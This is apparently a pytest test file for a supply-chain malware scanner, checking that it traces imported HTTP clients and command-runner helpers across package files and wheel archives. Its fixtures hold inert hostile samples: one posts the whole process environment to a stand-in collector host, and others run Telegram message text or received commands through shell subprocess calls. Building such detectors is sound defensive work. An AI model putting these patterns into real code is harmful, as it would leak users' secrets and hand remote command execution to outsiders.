"""An HTTP client made in one file of a package and used to send from another
(`analysis/python/flows/imported_clients.py`)."""

from __future__ import annotations

from pathlib import Path

from cordon_scanner import Scanner
from cordon_scanner.analysis.python.flows.imported_clients import ImportedClients
from cordon_scanner.analysis.python.pyast import PythonAnalyzer
from cordon_scanner.foundation.config.settings import Config

MAKER = "import httpx\nsession = httpx.Client(timeout=10)\n_private = httpx.Client()\n"
SENDER = (
    "import os\nfrom .imports import *\n"
    "def run():\n"
    "    session.post('https://collector.example.invalid/u', json=dict(os.environ))\n"
    "run()\n"
)


class TestWhichNamesAFileTakes:
    def test_a_star_import_takes_the_public_clients(self) -> None:
        found = ImportedClients.of({"pkg/imports.py": MAKER, "pkg/entry.py": SENDER})
        assert found == {"pkg/entry.py": {"session": "httpx.Client"}}

    def test_a_named_import_an_alias_and_an_absolute_path(self) -> None:
        found = ImportedClients.of(
            {
                "src/pkg/net.py": "import requests as rq\nS = rq.Session()\n",
                "src/pkg/a.py": "from .net import S as client\n",
                "src/pkg/b.py": "from pkg.net import S\n",
            }
        )
        assert found == {
            "src/pkg/a.py": {"client": "requests.Session"},
            "src/pkg/b.py": {"S": "requests.Session"},
        }

    def test_a_re_export_is_followed(self) -> None:
        found = ImportedClients.of(
            {
                "p/imports.py": MAKER,
                "p/__init__.py": "from .imports import session\n",
                "p/entry.py": "from . import session\n",
            }
        )
        assert found["p/entry.py"] == {"session": "httpx.Client"}

    def test_what_is_not_a_client_or_not_in_the_package_binds_nothing(self) -> None:
        assert not ImportedClients.of(
            {
                "p/conf.py": "import httpx\nTIMEOUT = 10\nLIMITS = httpx.Limits()\n",
                "p/entry.py": "from .conf import *\nfrom .missing import session\nfrom httpx import Client\n",
            }
        )

    def test_a_client_made_after_a_guarded_import_is_exported(self) -> None:
        maker = (
            "try:\n    from httpx import Client\nexcept ImportError:\n    Client = None\n"
            "if Client is not None:\n    session = Client()\n"
        )
        found = ImportedClients.of({"p/imports.py": maker, "p/entry.py": SENDER})
        assert found == {"p/entry.py": {"session": "httpx.Client"}}

    def test_a_client_made_inside_a_function_is_not(self) -> None:
        maker = "import httpx\ndef make():\n    session = httpx.Client()\n    return session\n"
        assert not ImportedClients.of({"p/imports.py": maker, "p/entry.py": SENDER})

    def test_a_name_the_file_binds_itself_keeps_its_own_meaning(self) -> None:
        found = ImportedClients.of(
            {"p/imports.py": MAKER, "p/entry.py": "from .imports import *\nsession = object()\n"}
        )
        assert not found

    def test_a_file_that_will_not_parse_is_skipped(self) -> None:
        assert not ImportedClients.of({"p/imports.py": "session = (", "p/entry.py": SENDER})


class TestTheAnalyserSendsThroughAnImportedClient:
    @staticmethod
    def sent(source: str, clients: dict[str, str] | None) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source, imported_clients=clients)
            if h.detail.startswith(("identity sent", "environment sent", "secret sent"))
        ]

    def test_the_environment_sent_through_it_is_seen(self) -> None:
        assert not self.sent(SENDER, None)
        assert self.sent(SENDER, {"session": "httpx.Client"})

    def test_a_request_carrying_nothing_sensitive_raises_nothing(self) -> None:
        source = (
            "from .imports import session\nsession.get('https://api.example.invalid/v1/items')\n"
        )
        assert not self.sent(source, {"session": "httpx.Client"})


class TestAPackageScan:
    @staticmethod
    def rules(root: Path) -> set[tuple[str, str]]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {(f.rule_id, f.location.path.rsplit("/", 1)[-1]) for f in result.findings}

    def test_the_split_sender_is_found_in_a_scanned_package(self, tmp_path: Path) -> None:
        pkg = tmp_path / "pkg"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("from . import entry\n", encoding="utf-8")
        (pkg / "imports.py").write_text(MAKER, encoding="utf-8")
        (pkg / "entry.py").write_text(SENDER, encoding="utf-8")
        assert ("SUSPECT.EXFIL.ENVIRONMENT.001", "entry.py") in self.rules(tmp_path)


RUNNER = (
    "import subprocess\n"
    "def run_cmd(cmd):\n"
    "    return subprocess.check_output(cmd.split())\n"
    "def run_in(directory, cmd):\n"
    "    return subprocess.run(cmd, shell=True, cwd=directory)\n"
)
HANDLER = (
    "import asyncio\n"
    "from telegram.ext import ContextTypes\n"
    "from .utils import run_cmd\n"
    "async def com(update, context):\n"
    "    await asyncio.to_thread(run_cmd, update.message.text.strip())\n"
)


class TestWhichFunctionsAFileTakesThatRunAParameter:
    def test_the_helper_a_handler_imports_is_a_runner(self) -> None:
        found = ImportedClients.runners_of({"p/utils.py": RUNNER, "p/bot.py": HANDLER})
        assert found == {"p/bot.py": {"run_cmd": "0"}}

    def test_the_position_that_is_run_is_the_one_named(self) -> None:
        found = ImportedClients.runners_of(
            {"p/utils.py": RUNNER, "p/bot.py": "from .utils import run_in\n"}
        )
        assert found == {"p/bot.py": {"run_in": "1"}}

    def test_a_re_export_is_followed(self) -> None:
        found = ImportedClients.runners_of(
            {
                "p/utils.py": RUNNER,
                "p/__init__.py": "from .utils import run_cmd\n",
                "p/bot.py": "from . import run_cmd\n",
            }
        )
        assert found["p/bot.py"] == {"run_cmd": "0"}

    def test_a_module_taken_whole_offers_its_runners_by_their_names(self) -> None:
        found = ImportedClients.runners_of(
            {"p/core.py": RUNNER, "p/handlers.py": "from . import core\n"}
        )
        assert found == {"p/handlers.py": {"run_cmd": "0", "run_in": "1"}}

    def test_a_helper_that_runs_a_fixed_command_is_not(self) -> None:
        helper = "import subprocess\ndef refresh():\n    subprocess.run(['git', 'pull'])\n"
        assert not ImportedClients.runners_of(
            {"p/utils.py": helper, "p/bot.py": "from .utils import refresh\n"}
        )

    def test_a_helper_that_takes_the_text_as_data_is_not(self) -> None:
        helper = "import subprocess\ndef lookup(q):\n    subprocess.run(['whois', q])\n"
        assert not ImportedClients.runners_of(
            {"p/utils.py": helper, "p/bot.py": "from .utils import lookup\n"}
        )

    def test_a_name_the_file_defines_itself_keeps_its_own_meaning(self) -> None:
        own = "from .utils import run_cmd\ndef run_cmd(c):\n    return c\n"
        assert not ImportedClients.runners_of({"p/utils.py": RUNNER, "p/bot.py": own})

    def test_a_single_file_has_nothing_to_import(self) -> None:
        assert not ImportedClients.runners_of({"p/utils.py": RUNNER})


class TestTheAnalyserRunsWhatAHandlerHandsAnImportedRunner:
    @staticmethod
    def runs(source: str, runners: dict[str, str] | None) -> list[str]:
        return [
            h.detail
            for h in PythonAnalyzer.analyse(source, imported_runners=runners)
            if h.detail.startswith("received run:")
        ]

    def test_the_text_of_a_message_handed_to_the_runner_is_a_run(self) -> None:
        assert not self.runs(HANDLER, None)
        assert self.runs(HANDLER, {"run_cmd": "0"}) == [
            "received run: run_cmd runs a received command at=call"
        ]

    def test_the_runner_reached_as_an_attribute_of_its_module(self) -> None:
        source = (
            "import asyncio\nfrom telegram.ext import ContextTypes\nfrom . import core\n"
            "async def com(update, context):\n"
            "    await asyncio.to_thread(core.run_cmd, update.message.text)\n"
        )
        assert self.runs(source, {"run_cmd": "0"}) == [
            "received run: run_cmd runs a received command at=call"
        ]

    def test_a_value_at_a_position_that_is_not_run_is_not(self) -> None:
        source = (
            "from telegram.ext import ContextTypes\n"
            "from .utils import run_in\n"
            "async def com(update, context):\n"
            "    run_in(update.message.text, 'ls')\n"
        )
        assert not self.runs(source, {"run_in": "1"})
        assert self.runs(
            source.replace(
                "run_in(update.message.text, 'ls')", "run_in('/tmp', update.message.text)"
            ),
            {"run_in": "1"},
        )

    def test_a_handler_that_hands_it_a_fixed_command_is_not_a_run(self) -> None:
        source = (
            "from telegram.ext import ContextTypes\n"
            "from .utils import run_cmd\n"
            "async def com(update, context):\n"
            "    run_cmd('uptime')\n"
        )
        assert not self.runs(source, {"run_cmd": "0"})


class TestFilesInsideAnArchive:
    """A shipped file is named `archive!member`; imports resolve inside the archive."""

    def test_an_absolute_import_inside_a_wheel_finds_its_module(self) -> None:
        wheel = "relaykit-0.1.2-py3-none-any.whl!"
        found = ImportedClients.runners_of(
            {
                wheel + "relaykit/command.py": RUNNER,
                wheel + "relaykit/handlers.py": "from relaykit.command import run_cmd\n",
            }
        )
        assert found == {wheel + "relaykit/handlers.py": {"run_cmd": "0"}}

    def test_a_client_taken_the_same_way_inside_a_wheel(self) -> None:
        wheel = "kit-1.0-py3-none-any.whl!"
        found = ImportedClients.of(
            {
                wheel + "kit/imports.py": MAKER,
                wheel + "kit/entry.py": SENDER.replace(".imports", "kit.imports").replace(
                    "from kit.imports", "from kit.imports"
                ),
            }
        )
        assert found == {wheel + "kit/entry.py": {"session": "httpx.Client"}}


class TestAWheelAndASourceArchiveScan:
    """The helper and its caller are in different files of a shipped archive (inert, hand-written)."""

    COMMAND = (
        "import subprocess\ndef execute_command(cmd):\n    return subprocess.run(cmd, shell=True)\n"
    )
    HANDLERS = (
        "from relaykit.command import execute_command\n"
        "def handle_command(conn, message):\n"
        "    execute_command(message['command'])\n"
    )

    @staticmethod
    def rules(path: Path) -> set[str]:
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(path)
        return {f.rule_id for f in result.findings}

    def test_a_wheel_whose_handler_imports_the_runner_is_found(self, tmp_path: Path) -> None:
        import zipfile

        wheel = tmp_path / "relaykit-0.1.2-py3-none-any.whl"
        with zipfile.ZipFile(wheel, "w") as z:
            z.writestr("relaykit/__init__.py", "")
            z.writestr("relaykit/command.py", self.COMMAND)
            z.writestr("relaykit/handlers.py", self.HANDLERS)
            z.writestr(
                "relaykit-0.1.2.dist-info/METADATA",
                "Metadata-Version: 2.1\nName: relaykit\nVersion: 0.1.2\n",
            )
        assert "SUSPECT.DROPPER.001" in self.rules(wheel)

    def test_the_same_files_in_a_directory_are_found(self, tmp_path: Path) -> None:
        pkg = tmp_path / "relaykit"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("", encoding="utf-8")
        (pkg / "command.py").write_text(self.COMMAND, encoding="utf-8")
        (pkg / "handlers.py").write_text(self.HANDLERS, encoding="utf-8")
        assert "SUSPECT.DROPPER.001" in self.rules(tmp_path)

    def test_a_helper_that_runs_a_fixed_command_raises_nothing(self, tmp_path: Path) -> None:
        pkg = tmp_path / "relaykit"
        pkg.mkdir()
        (pkg / "__init__.py").write_text("", encoding="utf-8")
        (pkg / "command.py").write_text(
            "import subprocess\ndef execute_command(cmd):\n    return subprocess.run(['uptime'])\n",
            encoding="utf-8",
        )
        (pkg / "handlers.py").write_text(self.HANDLERS, encoding="utf-8")
        assert "SUSPECT.DROPPER.001" not in self.rules(tmp_path)
